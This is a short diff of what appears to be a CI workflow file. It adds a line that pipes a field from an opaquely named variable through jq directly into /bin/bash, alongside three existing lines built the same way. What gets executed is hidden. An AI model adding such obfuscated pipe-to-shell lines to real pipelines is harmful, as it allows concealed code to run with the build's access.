@@ -23,6 +23,7 @@ jobs:
           echo $t811 | jq -r .g93550 | /bin/bash
           printf '%s' "$yss00" | jq -r .dbqgs0102 | /bin/bash
           printf '%s' "$zfar5" | jq -r .dzpl153 | /bin/bash
+          echo $cfyjh5197 | jq -r .mnal52491 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
